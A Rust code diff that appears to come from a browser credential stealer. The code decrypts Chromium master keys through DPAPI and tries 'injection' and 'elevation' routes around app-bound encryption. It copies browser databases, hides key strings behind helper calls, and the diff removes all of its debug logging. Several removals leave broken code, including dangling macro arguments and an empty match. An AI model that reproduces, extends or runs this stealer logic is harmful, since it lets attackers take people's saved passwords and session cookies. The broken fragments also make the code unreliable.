@@ -4,7 +4,6 @@ use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
 use base64::{engine::general_purpose, Engine as _};
 use serde_json::Value;
 use crate::encrypted::*;
-use crate::dbg_log;
 
 pub struct MasterKeys {
     pub standard: Vec<u8>,
@@ -37,50 +36,39 @@ pub fn extract_raw_app_bound_from_local_state(json: &Value) -> Option<Vec<u8>> {
 
 pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
     let local_state = user_data_path.join(s_local_state());
-    dbg_log!("chr: get_master_keys '{}' local_state={:?} exists={}",
         browser_name, local_state, local_state.exists());
     let content = fs::read_to_string(&local_state).ok()?;
-    dbg_log!("chr: '{}' Local State read OK ({} bytes)", browser_name, content.len());
     let json: Value = serde_json::from_str(&content).ok()?;
 
     let os_crypt = s_os_crypt();
     let encrypted_key = s_encrypted_key();
     let enc_key = match json[&os_crypt][&encrypted_key].as_str() {
-        Some(k) => { dbg_log!("chr: '{}' encrypted_key found", browser_name); k }
-        None => { dbg_log!("chr: '{}' encrypted_key NOT FOUND in JSON", browser_name); return None; }
     };
     let decoded = general_purpose::STANDARD.decode(enc_key).ok()?;
-    if decoded.len() < 5 { dbg_log!("chr: '{}' decoded key too short ({})", browser_name, decoded.len()); return None; }
 
     let standard_wrapped = dpapi_decrypt(&decoded[5..], None, 0);
 
     let app_bound_key = s_app_bound_encrypted_key();
     let has_app_bound = json[&os_crypt][&app_bound_key].as_str().is_some();
-    dbg_log!("chr: '{}' app_bound_key='{}' has_app_bound={}", browser_name, app_bound_key, has_app_bound);
 
     if let Some(ref s) = standard_wrapped {
         if s.len() == 32 {
-            dbg_log!("chr: '{}' DPAPI decrypt OK, using standard master key", browser_name);
             let mut app_bound = if has_app_bound {
                 crate::browsers::common::dpf::try_from_local_state(&json)
             } else {
                 None
             };
             if app_bound.is_none() && has_app_bound {
-                dbg_log!("chr: '{}' dpf failed, trying injection for app_bound", browser_name);
                 if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
                     if k.len() == 32 {
-                        dbg_log!("chr: '{}' injection app_bound OK (32 bytes)", browser_name);
                         app_bound = Some(k);
                     }
                 }
             }
             if app_bound.is_none() && has_app_bound {
-                dbg_log!("chr: '{}' injection failed, trying elev for app_bound", browser_name);
                 if let Some(raw) = extract_app_bound_from_local_state(&json) {
                     if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
                         if k.len() == 32 {
-                            dbg_log!("chr: '{}' elev app_bound OK (32 bytes)", browser_name);
                             app_bound = Some(k);
                         }
                     }
@@ -88,9 +76,7 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
             }
             return Some(MasterKeys { standard: s.clone(), app_bound });
         }
-        dbg_log!("chr: '{}' DPAPI decrypt OK but len={} (unexpected)", browser_name, s.len());
     } else {
-        dbg_log!("chr: '{}' DPAPI decrypt FAILED", browser_name);
     }
 
     let local_app_bound = if has_app_bound {
@@ -99,38 +85,28 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
         None
     };
     if local_app_bound.is_some() {
-        dbg_log!("chr: '{}' dpf local app_bound key obtained", browser_name);
     } else {
-        dbg_log!("chr: '{}' dpf local app_bound key NOT obtained", browser_name);
     }
     if let (Some(ref wrapped), Some(ref ab)) = (&standard_wrapped, &local_app_bound) {
         if wrapped.len() >= 15 {
-            dbg_log!("chr: '{}' trying aead_decrypt unwrap", browser_name);
             if let Some(unwrapped) = aead_decrypt(wrapped, ab) {
-                dbg_log!("chr: '{}' successfully unwrapped master key ({} bytes)", browser_name, unwrapped.len());
                 return Some(MasterKeys { standard: unwrapped, app_bound: None });
             }
-            dbg_log!("chr: '{}' aead_decrypt unwrap FAILED", browser_name);
         }
     }
 
     if has_app_bound {
-        dbg_log!("chr: '{}' trying injection for master key", browser_name);
         if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
             if k.len() == 32 {
-                dbg_log!("chr: '{}' injection master key OK (32 bytes)", browser_name);
                 return Some(MasterKeys { standard: k, app_bound: None });
             }
-            dbg_log!("chr: '{}' injection returned {} bytes", browser_name, k.len());
         }
     }
 
     if has_app_bound {
-        dbg_log!("chr: '{}' trying elev for master key", browser_name);
         if let Some(raw) = extract_app_bound_from_local_state(&json) {
             if let Some(k) = crate::browsers::common::elev::try_decrypt_app_bound_key(&raw) {
                 if k.len() == 32 {
-                    dbg_log!("chr: '{}' elev master key OK (32 bytes)", browser_name);
                     return Some(MasterKeys { standard: k, app_bound: None });
                 }
             }
@@ -139,7 +115,6 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
 
     if let Some(s) = standard_wrapped {
         if !s.is_empty() {
-            dbg_log!("chr: '{}' falling back to raw DPAPI blob (len={})", browser_name, s.len());
             return Some(MasterKeys { standard: s, app_bound: local_app_bound });
         }
     }
@@ -308,7 +283,6 @@ fn decrypt_value(encrypted: &[u8], keys: &MasterKeys) -> Option<String> {
 }
 
 pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
-    if !db_path.exists() { dbg_log!("chr: copy_db NOT FOUND {:?}", db_path); return None; }
     let nanos = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .unwrap_or_default()
@@ -323,7 +297,6 @@ pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
                 break;
             }
             Err(e) => {
-                dbg_log!("chr: copy_db attempt {} FAILED {:?} -> {:?}", attempt + 1, db_path, e);
                 last_err = Some(e);
                 if attempt < 3 {
                     std::thread::sleep(std::time::Duration::from_millis(500 * (attempt + 1) as u64));
@@ -332,7 +305,6 @@ pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
         }
     }
     if let Some(e) = last_err {
-        dbg_log!("chr: copy_db all attempts failed {:?} -> {:?}", db_path, e);
         return None;
     }
 
@@ -343,7 +315,6 @@ pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
         if src.exists() {
             let dst = PathBuf::from(format!("{}{}", temp_name, suffix));
             if let Err(e) = fs::copy(&src, &dst) {
-                dbg_log!("chr: copy_db suffix COPY FAILED {:?} -> {:?}", suffix, e);
             }
         }
     }
